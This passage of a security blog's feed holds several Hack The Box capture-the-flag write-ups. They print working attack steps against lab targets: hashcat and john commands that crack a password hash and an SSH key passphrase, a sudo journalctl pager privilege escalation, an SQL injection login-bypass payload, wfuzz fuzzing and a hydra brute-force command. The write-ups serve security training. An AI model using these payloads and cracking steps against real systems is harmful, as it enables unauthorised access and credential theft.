&lt;p&gt;&lt;code&gt;hashcat -m 500 -a 0 -o output.txt hashes.txt rockyou.txt&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traverxec&#x2F;htb-traverxec-hashcat.png&quot; alt=&quot;htb-traverxec-hashcat.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The password that was cracked is: Nowonly4me&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Using the cracked credentials, I tried logging into SSH but no luck. I believe it probably uses an SSH key.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Enumerating the machine further, the &lt;code&gt;nhttpd.conf&lt;&#x2F;code&gt; file seems kind of odd, especially these lines:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;# HOMEDIRS [OPTIONAL]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;homedirs	&#x2F;home
&lt;&#x2F;span&gt;&lt;span&gt;homedirs_public		public_www
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;According to the &lt;a href=&quot;https:&#x2F;&#x2F;www.gsp.com&#x2F;cgi-bin&#x2F;man.cgi?section=8&amp;amp;topic=nhttpd&quot;&gt;man page&lt;&#x2F;a&gt; of nostromo server, it mentions that the homedir is another way to access the user&#x27;s home directory by using &lt;code&gt;~username&lt;&#x2F;code&gt; as part of the URL. When trying to navigate to this url: http:&#x2F;&#x2F;traverxec&#x2F;~david, it leads to an image saying access denied.&lt;&#x2F;p&gt;
&lt;p&gt;Instead, I navigated to the user&#x27;s home directory instead:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;home&#x2F;david&#x2F;public_www&#x2F;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traverxec&#x2F;htb-traverxec-protectedarea.png&quot; alt=&quot;htb-traverxec-protectedarea.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Nice and this explains why I got the image when navigating via URL. Time to investigate what is inside this directory. I have found a directory inside that contains a backup of SSH keys. This must be our way in using SSH.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;First, I&#x27;ve tried using the private SSH key as is but it&#x27;s protected by a password. I will need to convert the SSH key into a format that &lt;code&gt;john&lt;&#x2F;code&gt; can understand.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa &amp;gt; id_rsa_john
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Use &lt;code&gt;john&lt;&#x2F;code&gt; to crack the hash.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;john --wordlist=&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt id_rsa_john --format=SSH
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The cracked password is hunter.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Login using the SSH private key and obtain user flag.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;ssh -i id_rsa_john david@traverxec
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traverxec&#x2F;htb-traverxec-userflag.png&quot; alt=&quot;htb-traverxec-userflag.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;A quick enumeration shows a script located in David&#x27;s home directory.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traverxec&#x2F;htb-traverxec-serverstats.png&quot; alt=&quot;htb-traverxec-serverstats.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This command seems interesting:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traverxec&#x2F;htb-traverxec-sudojournalctl.png&quot; alt=&quot;htb-traverxec-sudojournalctl.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Seeing how &lt;code&gt;sudo&lt;&#x2F;code&gt; is being used for the &lt;code&gt;journalctl&lt;&#x2F;code&gt; command, I&#x27;m wondering if there is a way to &lt;a href=&quot;https:&#x2F;&#x2F;gtfobins.github.io&#x2F;gtfobins&#x2F;journalctl&#x2F;&quot;&gt;escalate my privilege&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;After playing around on how this command works, eventually I caught onto what the gtfobin&#x27;s link mentioned:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;This invokes the default pager, which is likely to be **less**, other functions may apply.
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;When you run the command and minimize the window, it will trigger the &lt;code&gt;less&lt;&#x2F;code&gt; pager function.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traverxec&#x2F;htb-traverxec-halfwindow.png&quot; alt=&quot;htb-traverxec-halfwindow.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Thus, if a &lt;code&gt;less&lt;&#x2F;code&gt; pager function is triggered, you can escalate your privileges using &lt;a href=&quot;https:&#x2F;&#x2F;gtfobins.github.io&#x2F;gtfobins&#x2F;less&#x2F;&quot;&gt;this method&lt;&#x2F;a&gt;. Root flag has been obtained.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-traverxec&#x2F;htb-traverxec-rooted.png&quot; alt=&quot;htb-traverxec-rooted.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Cartographer</title>
        <published>2019-06-17T00:00:00+00:00</published>
        <updated>2019-06-17T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-cartographer/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-cartographer/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&amp;quot;Some underground hackers are developing a new command and control server. Can you break in and see what they are up to?&amp;quot;&lt;&#x2F;p&gt;
&lt;p&gt;This challenge was finding out if you can bypass the login screen. At first, I thought the hint was Cartography so I thought that “oh, maybe I take the .png image and decode the message using steganography tools.” Nope, this was the first mistake. I should have not focused so much time on doing the hard stuff first when I should have tried the lower hanging fruit such as SQL injection attacks.&lt;&#x2F;p&gt;
&lt;p&gt;To bypass the login screen, it was a matter of trying out SQL injection attack. I used the &lt;a href=&quot;https:&#x2F;&#x2F;pentestlab.blog&#x2F;2012&#x2F;12&#x2F;24&#x2F;sql-injection-authentication-bypass-cheat-sheet&#x2F;&quot;&gt;SQL injection cheat sheet&lt;&#x2F;a&gt; and if you insert:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;admin&amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;on the login page, it will bypass the login form.&lt;&#x2F;p&gt;
&lt;p&gt;After logging in, there isn&#x27;t much to look at besides a page that says under construction. In the URL, I noticed a strange &lt;code&gt;?info=&lt;&#x2F;code&gt; parameter.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;http:&#x2F;&#x2F;docker.hackthebox.eu:36005&#x2F;panel.php?info=lol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Playing around with it, invalid parameters show &lt;code&gt;page not found&lt;&#x2F;code&gt; error. I wonder if I could fuzz the URL and see if there are possible pages that can be found using a word list.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;wfuzz&lt;&#x2F;code&gt; is the tool of choice of what I need to do. First, we need to grab the cookie and pass onto &lt;code&gt;wfuzz&lt;&#x2F;code&gt; so it can produce the results correctly. If you don&#x27;t do this, it will only give you false positive results. Using &lt;code&gt;burpsuite&lt;&#x2F;code&gt;, we can grab the cookie:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-cartographer&#x2F;htb-cartographer-cookie.png&quot; alt=&quot;htb-cartographer-cookie.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Now we pass this cookie information to the &lt;code&gt;wfuzz&lt;&#x2F;code&gt; command.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-cartographer&#x2F;htb-cartographer-urlfuzz.png&quot; alt=&quot;htb-cartographer-urlfuzz.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;Protip&lt;&#x2F;code&gt;{: .info }&lt;&#x2F;p&gt;
&lt;p&gt;The &lt;code&gt;–ss&lt;&#x2F;code&gt; switch is for displaying only pages that contains the flag.&lt;&#x2F;p&gt;
&lt;p&gt;Navigating to the URL will show us the HTB flag.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Emdee Five For Life</title>
        <published>2019-06-17T00:00:00+00:00</published>
        <updated>2019-06-17T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-emdeefiveforlife/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-emdeefiveforlife/</id>
        
        <content type="html">&lt;p&gt;“Can you encrypt fast enough?”&lt;&#x2F;p&gt;
&lt;p&gt;This was my first challenge on HTB. It was fun and a little bit challenging. I couldn&#x27;t write this in Python as it was annoying for something this simple. I should do it in Python though so at least I understand how to write HTTP responses. In Ruby, I had less of trouble as the documentation is better and understandable. Overall, this is a nice challenge to get warmed up for other challenges to come.&lt;&#x2F;p&gt;
&lt;p&gt;What I could have improved on is the if else could be more precise when it finds the flag. I didn&#x27;t realized the flag was a specific string until I submitted the flag. Next time, I will know what to look for.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;ruby&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-ruby &quot;&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;require &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;net&#x2F;http&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;require &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;uri&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;require &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;digest&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;uri = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;URI&lt;&#x2F;span&gt;&lt;span&gt;.parse(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;docker.hackthebox.eu&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;uri.scheme = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;uri.host = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;docker.hackthebox.eu&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;uri.port = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;35404
&lt;&#x2F;span&gt;&lt;span&gt;uri.path = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;http = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Net&lt;&#x2F;span&gt;&lt;span&gt;::&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;HTTP&lt;&#x2F;span&gt;&lt;span&gt;::&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;new&lt;&#x2F;span&gt;&lt;span&gt;(uri.host, uri.port)
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;i = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while&lt;&#x2F;span&gt;&lt;span&gt; i &amp;lt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;do
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Loop #: &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + i.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;to_s
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;	get_request = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Net&lt;&#x2F;span&gt;&lt;span&gt;::&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;HTTP&lt;&#x2F;span&gt;&lt;span&gt;::&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Get&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;new&lt;&#x2F;span&gt;&lt;span&gt;(uri.request_uri)
&lt;&#x2F;span&gt;&lt;span&gt;	get_response = http.request(get_request)
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;	get_string = &#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;[A-Za-z0-9]{20}&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;match&lt;&#x2F;span&gt;&lt;span&gt;(get_response.body)
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Captured string: &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + get_string.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;to_s
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;	cookies = get_response.response[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;set-cookie&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;	encrypt_string_md5 = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Digest&lt;&#x2F;span&gt;&lt;span&gt;::&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;MD5&lt;&#x2F;span&gt;&lt;span&gt;.hexdigest(get_string.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;to_s&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Encrypted MD5: &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + encrypt_string_md5
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;	post_request = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Net&lt;&#x2F;span&gt;&lt;span&gt;::&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;HTTP&lt;&#x2F;span&gt;&lt;span&gt;::&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Post&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;new&lt;&#x2F;span&gt;&lt;span&gt;(uri.request_uri)
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;	post_request.set_form_data({&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;hash&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; =&amp;gt; encrypt_string_md5})
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;	post_request[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Cookie&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;] = cookies
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;	post_response = http.request(post_request)
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;	get_post_response = &#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;Too\sslow!&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;match&lt;&#x2F;span&gt;&lt;span&gt;(post_response.body)
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt; get_post_response.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;nil? &lt;&#x2F;span&gt;&lt;span&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;false
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt; get_post_response.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;to_s &lt;&#x2F;span&gt;&lt;span&gt;+ &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt; post_response.body
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;end
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span&gt;i += &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt; 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;end
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Useful link: &lt;a href=&quot;https:&#x2F;&#x2F;yukimotopress.github.io&#x2F;http&quot;&gt;https:&#x2F;&#x2F;yukimotopress.github.io&#x2F;http&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Lernaean</title>
        <published>2019-06-17T00:00:00+00:00</published>
        <updated>2019-06-17T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-lernaean/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-lernaean/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&amp;quot;Your target is not very good with computers. Try and guess their password to see if they may be hiding anything!&amp;quot;&lt;&#x2F;p&gt;
&lt;p&gt;This challenge wasn&#x27;t too bad. The parts that I struggled with was getting the right syntax for hydra and putting together a post request script in Ruby which I&#x27;ve partially borrowed from Emdee five for life - Web challenge.&lt;&#x2F;p&gt;
&lt;p&gt;To start off with this challenge, it was a simple textbox that you need to input a password. To brute force the password, &lt;code&gt;hydra&lt;&#x2F;code&gt; and &lt;code&gt;rockyou.txt&lt;&#x2F;code&gt; was used for this task.&lt;&#x2F;p&gt;
&lt;p&gt;We need to grab the cookie first and pass onto hydra.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-lernaean&#x2F;htb-lernaean-cookie.png&quot; alt=&quot;htb-lernaean-cookie.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;hydra -l dummy -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt docker.hackthebox.eu -s 36029 http-post-form &amp;quot;&#x2F;index.php:user=^USER^&amp;amp;password=^PASS^:Invalid password:h=Cookie: PHPSESSID=guu956jep1i9qdk0a5huo3u4c0&amp;quot; -V
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I struggled with hydra because I thought that the first part of the ternary required &#x2F;index.php or something because it kept rejecting &amp;quot;&#x2F;&amp;quot; as a parameter. I used dirbuster to find out if &lt;code&gt;index.php&lt;&#x2F;code&gt; is the correct page to be using. Now that I think of it, why did I use dirbuster just for that purpose.&lt;&#x2F;p&gt;
&lt;p&gt;The other part is the 3rd parameter of the ternary: &amp;quot;Invalid password&amp;quot;. I did not know that this field had to match the output of the result. All the tutorials that I&#x27;ve read online doesn&#x27;t really mention about this field. If I entered some other text, the results will show all as matching passwords.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-lernaean&#x2F;htb-lernaean-hydra.png&quot; alt=&quot;htb-lernaean-hydra&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;As you can now see, the password is &amp;quot;leonardo&amp;quot;. Upon inputting this password into the field, it redirects to a new page and tells us that we&#x27;re too slow.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-lernaean&#x2F;htb-lernaean-tooslow.png&quot; alt=&quot;htb-lernaean-tooslow&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I took a look at the source page for possible flags but I didn&#x27;t see any.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;At this point, I figured maybe it&#x27;s a false password that led me to a wrong path. I removed the password from &lt;code&gt;rockyou.txt&lt;&#x2F;code&gt; and continued with brute forcing the password and see if it leads me anywhere. After an hour, I gave up and started to write my POST script.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;require &amp;#39;net&#x2F;http&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;require &amp;#39;uri&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;uri = URI.parse(&amp;quot;http:&#x2F;&#x2F;docker.hackthebox.eu&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;uri.scheme = &amp;quot;http&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;uri.host = &amp;quot;docker.hackthebox.eu&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;uri.port = 36029
&lt;&#x2F;span&gt;&lt;span&gt;uri.path = &amp;quot;&#x2F;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;http = Net::HTTP::new(uri.host, uri.port)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;get_request = Net::HTTP::Get.new(uri.request_uri)
&lt;&#x2F;span&gt;&lt;span&gt;get_response = http.request(get_request)
&lt;&#x2F;span&gt;&lt;span&gt;# puts http.request(get_request).body
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;cookies = get_response.response[&amp;#39;set-cookie&amp;#39;]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;post_request = Net::HTTP::Post.new(uri.request_uri)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;password = &amp;quot;leonardo&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;post_request.set_form_data(&amp;quot;password&amp;quot; =&amp;gt; password)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;post_request[&amp;#39;Cookie&amp;#39;] = cookies
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;post_response = http.request(post_request)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;puts post_response.body
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Running the script will show the HTB flag.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-lernaean&#x2F;htb-lernaean-flag.png&quot; alt=&quot;htb-lernaean-flag&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;Protip&lt;&#x2F;code&gt;{: .info }&lt;&#x2F;p&gt;
&lt;p&gt;Useful link: &lt;a href=&quot;https:&#x2F;&#x2F;www.hempstutorials.co.uk&#x2F;brute-forcing-passwords-with-thc-hydra&#x2F;&quot;&gt;https:&#x2F;&#x2F;www.hempstutorials.co.uk&#x2F;brute-forcing-passwords-with-thc-hydra&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>My OSCP Cheatsheet</title>
        <published>2019-05-25T00:00:00+00:00</published>
